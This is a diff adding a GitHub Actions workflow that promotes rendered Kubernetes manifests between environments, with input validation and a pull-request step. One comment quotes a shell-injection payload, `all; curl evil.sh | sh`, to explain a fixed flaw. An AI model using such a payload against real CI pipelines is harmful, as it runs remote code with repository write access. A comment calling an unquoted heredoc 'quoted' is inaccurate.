@@ -1,0 +1,218 @@
+---
+# Copy manifests between environments BIT-IDENTICALLY, applying only a namespace overlay.
+#
+# It does not re-render. That is the entire point: a re-render at promotion time could pick
+# up a different chart version, a different default, or a different base image, and nothing
+# in the diff would say so. Copying bytes makes "staging runs the same thing as production"
+# verifiable rather than asserted.
+name: promote
+
+on:
+  workflow_dispatch:
+    inputs:
+      app:
+        description: Application directory name, e.g. platform-observability. Use "all" for every app.
+        type: string
+        required: true
+      from:
+        description: Source environment
+        type: choice
+        options: [development, staging]
+        default: staging
+        required: true
+      to:
+        description: Target environment
+        type: choice
+        options: [staging, production]
+        default: production
+        required: true
+
+permissions:
+  contents: read
+
+concurrency:
+  group: promote-${{ inputs.to }}
+  cancel-in-progress: false
+
+jobs:
+  promote:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 20
+    permissions:
+      contents: write
+      pull-requests: write
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
+        with:
+          persist-credentials: false
+
+      - name: Reject an invalid promotion path
+        env:
+          FROM: ${{ inputs.from }}
+          TO: ${{ inputs.to }}
+        run: |
+          set -euo pipefail
+          # development → production skips staging, which is the whole point of staging.
+          case "$FROM→$TO" in
+            development→staging|staging→production) ;;
+            *)
+              echo "::error::$FROM → $TO is not a valid promotion path."
+              echo "Valid: development → staging, staging → production."
+              exit 1 ;;
+          esac
+
+      - id: copy
+        name: Copy manifests
+        # APP is a free-text workflow_dispatch input. Interpolated with `${{ }}` it was
+        # substituted into the shell source before bash parsed it, so a value like
+        # `all; curl evil.sh | sh` executed. This job holds contents: write and
+        # pull-requests: write, so that is a real escalation from "can dispatch" to "can push
+        # to any branch and open PRs as the bot".
+        #
+        # Through the environment the value is data. It is also validated below, because a
+        # bad app name should fail by name rather than by promoting nothing.
+        env:
+          APP: ${{ inputs.app }}
+          FROM_ENV: ${{ inputs.from }}
+          TO_ENV: ${{ inputs.to }}
+        run: |
+          set -euo pipefail
+          FROM="rendered/$FROM_ENV"
+          TO="rendered/$TO_ENV"
+
+          if [ "$APP" = "all" ]; then
+            mapfile -t apps < <(find "$FROM" -mindepth 1 -maxdepth 1 -type d -printf '%f\n' | sort)
+          else
+            # A single app name: no slashes, no traversal, no shell metacharacters.
+            case "$APP" in
+              */*|*..*|*[!a-zA-Z0-9._-]*)
+                echo "::error::app must be a plain directory name — got '$APP'"
+                exit 1 ;;
+            esac
+            apps=("$APP")
+          fi
+
+          if [ ${#apps[@]} -eq 0 ]; then
+            echo "::error::nothing to promote from $FROM"
+            exit 1
+          fi
+
+          for app in "${apps[@]}"; do
+            src="$FROM/$app"
+            dst="$TO/$app"
+            if [ ! -d "$src" ]; then
+              echo "::error::$src does not exist"
+              exit 1
+            fi
+
+            mkdir -p "$dst"
+            rm -f "$dst"/*.yaml
+
+            for f in "$src"/*.yaml; do
+              # The ONLY transformation. Namespace and environment label, nothing else. If a
+              # promotion ever needs more than this, the environments have diverged and that
+              # is the thing to fix.
+              sed -e "s/namespace: ${FROM_ENV}-/namespace: ${TO_ENV}-/g" \
+                  -e "s/environment: ${FROM_ENV}/environment: ${TO_ENV}/g" \
+                  "$f" > "$dst/$(basename "$f")"
+            done
+            echo "promoted $app"
+          done
+
+          echo "apps=${apps[*]}" >> "$GITHUB_OUTPUT"
+
+      - name: Verify nothing but the overlay changed
+        env:
+          TO_ENV: ${{ inputs.to }}
+        run: |
+          set -euo pipefail
+          # Every remaining difference must be a namespace or environment line. Anything else
+          # means the copy did something it should not have.
+          unexpected=$(git diff -U0 -- "rendered/$TO_ENV" \
+            | grep -E '^[+-]' \
+            | grep -vE '^[+-]{3}' \
+            | grep -vE '^[+-].*(namespace:|environment:)' \
+            | head -20 || true)
+          if [ -n "$unexpected" ]; then
+            echo "::error::promotion changed more than the namespace overlay:"
+            echo "$unexpected"
+            exit 1
+          fi
+          echo "Promotion is bit-identical apart from the namespace overlay."
+
+      - name: Open the promotion PR
+        # Inputs arrive through the environment, never through `${{ }}` interpolation into the
+        # script body — see the copy step above for why that matters in a job holding
+        # contents: write.
+        env:
+          GH_TOKEN: ${{ github.token }}
+          APP: ${{ inputs.app }}
+          FROM_ENV: ${{ inputs.from }}
+          TO_ENV: ${{ inputs.to }}
+          RUN_NUMBER: ${{ github.run_number }}
+          APPS: ${{ steps.copy.outputs.apps }}
+        run: |
+          set -euo pipefail
+
+          branch="promote/${FROM_ENV}-to-${TO_ENV}-${RUN_NUMBER}"
+          git config user.name "mindclade-gitops[bot]"
+          git config user.email "mindclade-gitops[bot]@users.noreply.github.com"
+          git checkout -b "$branch"
+          git add rendered/
+
+          if git diff --cached --quiet; then
+            echo "Nothing to promote — target already matches source."
+            exit 0
+          fi
+
+          title="promote(${TO_ENV}): ${APP} from ${FROM_ENV}"
+          git commit -m "$title"
+
+          # Explicit token in the push URL. Checkout ran with persist-credentials: false, so
+          # there is no credential in git config — deliberately, because a token left there is
+          # readable by every later step.
+          remote="https://x-access-token:${GH_TOKEN}@github.com/${GITHUB_REPOSITORY}.git"
+          git push "$remote" "$branch"
+
+          # A quoted heredoc, not string concatenation.
+          #
+          # The previous version built this with `body+='\n'` inside SINGLE quotes, which
+          # appends the two characters backslash and n rather than a newline — every promotion
+          # PR body rendered as one long line with literal \n in it. A quoted heredoc also
+          # means nothing in the text is re-expanded by the shell.
+          body_file="$(mktemp)"
+          cat > "$body_file" <<EOF
+          ## Promotion — ${FROM_ENV} → ${TO_ENV}
+
+          Apps: \`${APPS}\`
+
+          Manifests were **copied bit-identically**. The only transformation applied was the
+          namespace and environment overlay — no re-render, so this cannot have picked up a
+          different chart version or base image than the source environment is running.
+
+          **The diff below is the exact cluster delta.** Not an approximation of it.
+
+          ### Before approving
+
+          - [ ] The diff contains only what you expected to promote.
+          - [ ] Every image is pinned by digest.
+          - [ ] The source environment has been healthy long enough to mean something.
+          - [ ] No deploy freeze is in effect (\`freeze.yml\` checks this too).
+          EOF
+          # Strip the indentation the heredoc carries for readability above.
+          sed -i 's/^          //' "$body_file"
+
+          existing="$(gh pr list --state open --head "$branch" --json number --jq '.[0].number' --limit 1)"
+          if [ -n "$existing" ] && [ "$existing" != "null" ]; then
+            gh pr edit "$existing" --title "$title" --body-file "$body_file" \
+              --add-label promotion --add-label "$TO_ENV"
+            echo "::notice::Updated #$existing"
+          else
+            # `gh pr create` prints the PR URL and has NO --json flag — the previous version
+            # passed `--json number -q .number`, which exits with "unknown flag" and took the
+            # whole step down. Parse the number off the URL it does print.
+            url="$(gh pr create --base main --head "$branch" --title "$title" --body-file "$body_file")"
+            number="${url##*/}"
+            gh pr edit "$number" --add-label promotion --add-label "$TO_ENV"
+            echo "::notice::Opened #$number — $url"
+          fi
